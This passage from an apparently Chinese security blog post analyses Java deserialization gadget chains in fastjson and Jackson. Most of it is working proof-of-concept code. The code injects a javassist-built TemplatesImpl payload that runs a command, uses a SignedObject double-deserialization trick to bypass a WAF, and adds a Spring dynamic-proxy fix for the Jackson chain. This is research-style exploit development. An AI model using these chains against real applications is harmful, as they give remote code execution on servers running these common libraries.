+<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson2.JSONArray;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception{</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception{</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.makeClass(<span class="string">"a"</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(AbstractTranslet.class.getName());</span><br><span class="line">        clazz.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]{}, clazz);</span><br><span class="line">        constructor.setBody(<span class="string">"Runtime.getRuntime().exec(\"calc\");"</span>);</span><br><span class="line">        clazz.addConstructor(constructor);</span><br><span class="line">        <span class="type">byte</span>[][] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]{clazz.toBytecode()};</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setValue(templates, <span class="string">"_bytecodes"</span>, bytes);</span><br><span class="line">        setValue(templates, <span class="string">"_name"</span>, <span class="string">"yyjccc"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        jsonObject.put(<span class="string">"1"</span>, templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">val</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">valfield</span> <span class="operator">=</span> val.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        valfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        valfield.set(val, jsonObject);</span><br><span class="line">	</span><br><span class="line">		 <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">		<span class="comment">// HashMap 中 key 先反序列化</span></span><br><span class="line">        hashMap.put(templates,bad);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        objectOutputStream.writeObject(hashMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>‍</p>
+<p>补充：</p>
+<p>高版本fastjson中，JSONObjec/JSONArray 反序列化加载类的时候</p>
+<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line">protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc)</span><br><span class="line">               throws IOException, ClassNotFoundException {</span><br><span class="line">           String name = desc.getName();</span><br><span class="line">           <span class="keyword">if</span> (name.length() &gt; <span class="number">2</span>) {</span><br><span class="line">               <span class="type">int</span> index = name.lastIndexOf(<span class="string">'['</span>);</span><br><span class="line">               <span class="keyword">if</span> (index != <span class="number">-1</span>) {</span><br><span class="line">                   name = name.substring(index + <span class="number">1</span>);</span><br><span class="line">               }</span><br><span class="line">               <span class="keyword">if</span> (name.length() &gt; <span class="number">2</span> &amp;&amp; name.charAt(<span class="number">0</span>) == <span class="string">'L'</span> &amp;&amp; name.charAt(name.length() - <span class="number">1</span>) == <span class="string">';'</span>) {</span><br><span class="line">                   name = name.substring(<span class="number">1</span>, name.length() - <span class="number">1</span>);</span><br><span class="line">               }</span><br><span class="line"></span><br><span class="line">               <span class="keyword">if</span> (TypeUtils.getClassFromMapping(name) == null) {</span><br><span class="line">                   ParserConfig.global.checkAutoType(name, null, Feature.SupportAutoType.mask);</span><br><span class="line">               }</span><br><span class="line">           }</span><br><span class="line">           <span class="keyword">return</span> super.resolveClass(desc);</span><br><span class="line">       }</span><br></pre></td></tr></tbody></table></figure>
+
+<p>ParserConfig.global.checkAutoType(name, null, Feature.SupportAutoType.mask);</p>
+<p>正是fastjson autoType检查 加载类的过程（黑白名单）</p>
+<p>但是loadClass后，会获取beanInfo</p>
+<p><img src="/img/2025/2-8/Snipaste_2025-02-08_16-41-44-20250208164329-fc5sxfd.png">​</p>
+<p>然后会获取无参构造方法，但是某些类没声明无参构造方法，会导致抛出异常，终止反序列化</p>
+<p>但也得益于fastjson缓存机制，加载类成功后会缓存到map，上面代码 中若缓存中存在该类名，直接调用super.resolveClass</p>
+<p>因此有些情况需要反序列化两次</p>
+<p>例如：利用fastjson触发二次反序列化绕waf,其中SignObject 就是这个例子</p>
+<p>打两次就好了</p>
+<p>‍</p>
+<p>例题：</p>
+<p><img src="/img/2025/2-8/Snipaste_2025-02-08_16-49-59-20250208165157-3fywc5a.png">​</p>
+<p>‍</p>
+<p>利用fastjson 触发SignObject#getObject</p>
+<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.makeClass(<span class="string">"a"</span>);</span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(AbstractTranslet.class.getName());</span><br><span class="line">    clazz.setSuperclass(superClass);</span><br><span class="line">    <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]{}, clazz);</span><br><span class="line">    constructor.setBody(<span class="string">"Runtime.getRuntime().exec(\"calc\");"</span>);</span><br><span class="line">    clazz.addConstructor(constructor);</span><br><span class="line">    <span class="type">byte</span>[][] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]{clazz.toBytecode()};</span><br><span class="line">    <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">    ReflectField.setField(templates, <span class="string">"_bytecodes"</span>, bytes);</span><br><span class="line">    ReflectField.setField(templates, <span class="string">"_name"</span>, <span class="string">"yyjccc"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">    jsonObject.put(<span class="string">"1"</span>, templates);</span><br><span class="line"></span><br><span class="line">    <span class="type">BadAttributeValueExpException</span> <span class="variable">bad</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">valfield</span> <span class="operator">=</span> bad.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">    valfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    valfield.set(bad, jsonObject);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    <span class="comment">// HashMap 中 key 先反序列化</span></span><br><span class="line">    hashMap.put(templates,bad);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">"DSA"</span>);</span><br><span class="line">    kpg.initialize(<span class="number">1024</span>);</span><br><span class="line">    <span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line">    <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(hashMap, kp.getPrivate(), Signature.getInstance(<span class="string">"DSA"</span>));</span><br><span class="line"></span><br><span class="line">    <span class="type">JSONArray</span> <span class="variable">jsonArray1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">    jsonArray1.add(signedObject);</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">    <span class="type">EventListenerList</span> <span class="variable">eventListenerList</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EventListenerList</span>();</span><br><span class="line">    <span class="type">UndoManager</span> <span class="variable">undoManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UndoManager</span>();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">edits</span> <span class="operator">=</span> CompoundEdit.class.getDeclaredField(<span class="string">"edits"</span>);</span><br><span class="line">    edits.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Vector</span> <span class="variable">vector</span> <span class="operator">=</span> (Vector)edits.get(undoManager);</span><br><span class="line">    vector.add(jsonArray1);</span><br><span class="line">    ReflectField.setField(eventListenerList, <span class="string">"listenerList"</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]{InternalError.class, undoManager});</span><br><span class="line"></span><br><span class="line">    <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">    <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">    oos.writeObject(eventListenerList);</span><br><span class="line">    oos.close();</span><br><span class="line">    System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(Base64.getEncoder().encode(baos.toByteArray())));</span><br></pre></td></tr></tbody></table></figure>
+
+<p>需要先打1次，然后才能正常触发</p>
+<p>‍</p>
+<h2 id="Jackson原生反序列化"><a href="#Jackson原生反序列化" class="headerlink" title="Jackson原生反序列化"></a>Jackson原生反序列化</h2><h3 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h3><p>这条 JACKSON 链可以直接在无任何额外依赖的 SpringBoot 环境下使用</p>
+<p>jackson获取属性值也是通过getter方法来获取的， 跟fastjson原生反序列化一样是由toString 方法触发</p>
+<p>​<code>com.fasterxml.jackson.databind.node.BaseJsonNode</code>​ 这个类toString</p>
+<p>‍</p>
+<p>最后是在<code>BeanSerializerBase#serializeFields 中 prop.serializeAsField</code>​里面调用getter方法![Snipaste_2024-10-03_16-18-56]<img src="/img/2025/2-8/Snipaste_2024-10-03_16-18-56-20241003161933-tf9vu7u.png">​</p>
+<p>​<code>POJONode</code>​继承了<code>BaseJsonNode</code>​</p>
+<p>在<code>BeanSerializerFactory#constructBeanOrAddOnSerializer</code>​ 中获取合适的getter ,其中细节就跳过</p>
+<p>但是还是有问题</p>
+<p><img src="/img/2025/2-8/Snipaste_2024-10-03_16-53-51-20241003165423-h3k5j0o.png">​</p>
+<p>​<code>BaseJsonNode</code>​ 中含有<code>writeReplace</code>​ 方法 会导致序列化的时候调用，导致提前触发而序列化失败</p>
+<p><img src="/img/2025/2-8/Snipaste_2024-10-03_16-56-23-20241003165639-iuactdc.png">​</p>
+<p>使用javassist 可以删除该方法</p>
+<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">CtClass</span> <span class="variable">jsonNode</span> <span class="operator">=</span> pool.get(<span class="string">"com.fasterxml.jackson.databind.node.BaseJsonNode"</span>);</span><br><span class="line"><span class="type">CtMethod</span> <span class="variable">writeReplace</span> <span class="operator">=</span> jsonNode.getDeclaredMethod(<span class="string">"writeReplace"</span>);</span><br><span class="line">jsonNode.removeMethod(writeReplace);</span><br><span class="line"><span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">jsonNode.toClass(classLoader, <span class="literal">null</span>);</span><br></pre></td></tr></tbody></table></figure>
+
+<p>构造出poc:</p>
+<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.HttpsURLConnection;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLContext;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.TrustManager;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.X509TrustManager;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.HttpURLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.security.SecureRandom;</span><br><span class="line"><span class="keyword">import</span> java.security.cert.X509Certificate;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception {</span><br><span class="line">		<span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.makeClass(<span class="string">"a"</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(AbstractTranslet.class.getName());</span><br><span class="line">        clazz.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]{}, clazz);</span><br><span class="line">        constructor.setBody(<span class="string">"Runtime.getRuntime().exec(\"calc\");"</span>);</span><br><span class="line">        clazz.addConstructor(constructor);</span><br><span class="line">        <span class="type">byte</span>[] bytes = clazz.toBytecode();</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">"_bytecodes"</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]{bytes});</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">"_name"</span>, <span class="string">"yyjccc"</span>);</span><br><span class="line">   </span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">jsonNode</span> <span class="operator">=</span> pool.get(<span class="string">"com.fasterxml.jackson.databind.node.BaseJsonNode"</span>);</span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">writeReplace</span> <span class="operator">=</span> jsonNode.getDeclaredMethod(<span class="string">"writeReplace"</span>);</span><br><span class="line">        jsonNode.removeMethod(writeReplace);</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">        jsonNode.toClass(classLoader, <span class="literal">null</span>);</span><br><span class="line">    </span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(templatesImpl);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">"javax.management.BadAttributeValueExpException"</span>).getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(exp,jsonNodes);</span><br><span class="line">    </span><br><span class="line">        SerializeUtil.serialize(exp);</span><br><span class="line">	}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="Jackson链的不稳定性"><a href="#Jackson链的不稳定性" class="headerlink" title="Jackson链的不稳定性"></a>Jackson链的不稳定性</h3><p>如果多重启几次springboot环境 ，或者运气不好就不会成功</p>
+<p>可以发现有getter的属性 除了 output 还有<code>transletIndex</code>​、<code>stylesheetDOM</code>​</p>
+<p><img src="/img/2025/2-8/Snipaste_2024-10-03_17-16-53-20241003171712-4skxk49.png">​</p>
+<p>经过在springboot 环境下 多重启几次调式就可以发现 他们的顺序是随机的</p>
+<p>如果当先触发<code>getStylesheetDOM</code>​方法的时候</p>
+<p><img src="/img/2025/2-8/Snipaste_2024-10-03_17-20-52-20241003172110-xcgic7h.png">​</p>
+<p>_sdom 属性没有在readObject 方法中做任何处理，即便设置默认值 ，经过反序列化后得到的是null</p>
+<p><img src="/img/2025/2-8/Snipaste_2024-10-03_17-23-05-20241003172329-ridyvvd.png">​</p>
+<p>那么就会触发空指针异常提前退出</p>
+<p>就会如下报错</p>
+<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line">Caused by: java.lang.NullPointerException</span><br><span class="line">    at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getStylesheetDOM(TemplatesImpl.java:<span class="number">450</span>)</span><br><span class="line">    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)</span><br><span class="line">    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:<span class="number">62</span>)</span><br><span class="line">    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:<span class="number">43</span>)</span><br><span class="line">    at java.lang.reflect.Method.invoke(Method.java:<span class="number">483</span>)</span><br><span class="line">    at com.fasterxml.jackson.databind.ser.BeanPropertyWriter.serializeAsField(BeanPropertyWriter.java:<span class="number">689</span>)</span><br><span class="line">    at com.fasterxml.jackson.databind.ser.std.BeanSerializerBase.serializeFields(BeanSerializerBase.java:<span class="number">774</span>)</span><br><span class="line">    ... <span class="number">74</span> more</span><br></pre></td></tr></tbody></table></figure>
+
+<p>根本原因 ，是由于java中getMethods方法返回方法数组中顺序是随机的</p>
+<p>可以参考这篇文章：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/XrAD1Q09mJ-95OXI2KaS9Q">https://mp.weixin.qq.com/s/XrAD1Q09mJ-95OXI2KaS9Q</a></p>
+<p>‍</p>
+<p>参考网上的解决方案：使用动态代理</p>
+<p>一个动态代理对象的方法是其代理的接口中的方法</p>
+<p>而刚好TemplatesImpl 实现了接口<code>Templates</code>​ 其其中刚好只有上面三个方法中的<code>getOutputProperties</code>​</p>
+<p><img src="/img/2025/2-8/Snipaste_2024-10-03_17-34-48-20241003173609-ainrsfb.png">​</p>
+<p>由于一般都有spring依赖，使用spring的动态代理</p>
+<p>​<code>JdkDynamicAopProxy</code>​ (也是实现了<code>Serializable</code>​ 接口)</p>
+<p>其中的incoke 方法</p>
+<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable {</span><br><span class="line">       <span class="type">Object</span> <span class="variable">oldProxy</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">       <span class="type">boolean</span> <span class="variable">setProxyContext</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">       <span class="type">TargetSource</span> <span class="variable">targetSource</span> <span class="operator">=</span> <span class="built_in">this</span>.advised.targetSource;</span><br><span class="line">       <span class="type">Object</span> <span class="variable">target</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">	......</span><br><span class="line"></span><br><span class="line">               target = targetSource.getTarget();</span><br><span class="line">               Class&lt;?&gt; targetClass = target != <span class="literal">null</span> ? target.getClass() : <span class="literal">null</span>;</span><br><span class="line">               List&lt;Object&gt; chain = <span class="built_in">this</span>.advised.getInterceptorsAndDynamicInterceptionAdvice(method, targetClass);</span><br><span class="line">               .......</span><br><span class="line"></span><br><span class="line">      </span><br><span class="line">   }</span><br></pre></td></tr></tbody></table></figure>
+
+<p>可以看出来被代理的对象存于advised 属性，即<code>AdvisedSupport</code>​类</p>
+<p><img src="/img/2025/2-8/Snipaste_2024-10-03_18-12-10-20241003181228-pxb7a5t.png">​</p>
+<p>而被代理对象又存于<code>targetSource</code>​</p>
+<p>不过<code>AdvisedSupport#setTarget</code>​ 的方法就可以直接设置被代理对象</p>
+<p><img src="/img/2025/2-8/Snipaste_2024-10-03_18-11-50-20241003181404-i903ofi.png">​</p>
+<p>构建动态代理</p>
+<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">AdvisedSupport</span> <span class="variable">advisedSupport</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>();</span><br><span class="line">advisedSupport.setTarget(templatesImpl);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">"org.springframework.aop.framework.JdkDynamicAopProxy"</span>)</span><br><span class="line">                .getConstructor(AdvisedSupport.class);</span><br><span class="line">c.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler)c.newInstance(advisedSupport);</span><br><span class="line"><span class="type">Object</span> <span class="variable">proxy</span> <span class="operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]{Templates.class}, handler);</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="最终poc"><a href="#最终poc" class="headerlink" title="最终poc"></a>最终poc</h3><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.framework.AdvisedSupport;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception {</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.makeClass(<span class="string">"a"</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(AbstractTranslet.class.getName());</span><br><span class="line">        clazz.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]{}, clazz);</span><br><span class="line">        constructor.setBody(<span class="string">"Runtime.getRuntime().exec(\"calc\");"</span>);</span><br><span class="line">        clazz.addConstructor(constructor);</span><br><span class="line">        <span class="type">byte</span>[] bytes = clazz.toBytecode();</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">"_bytecodes"</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]{bytes});</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">"_name"</span>, <span class="string">"yyjccc"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">AdvisedSupport</span> <span class="variable">advisedSupport</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>();</span><br><span class="line">        advisedSupport.setTarget(templatesImpl);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">"org.springframework.aop.framework.JdkDynamicAopProxy"</span>)</span><br><span class="line">                .getConstructor(AdvisedSupport.class);</span><br><span class="line">        c.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler)c.newInstance(advisedSupport);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">proxy</span> <span class="operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]{Templates.class}, handler);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">jsonNode</span> <span class="operator">=</span> pool.get(<span class="string">"com.fasterxml.jackson.databind.node.BaseJsonNode"</span>);</span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">writeReplace</span> <span class="operator">=</span> jsonNode.getDeclaredMethod(<span class="string">"writeReplace"</span>);</span><br><span class="line">        jsonNode.removeMethod(writeReplace);</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">        jsonNode.toClass(classLoader, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(proxy);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span 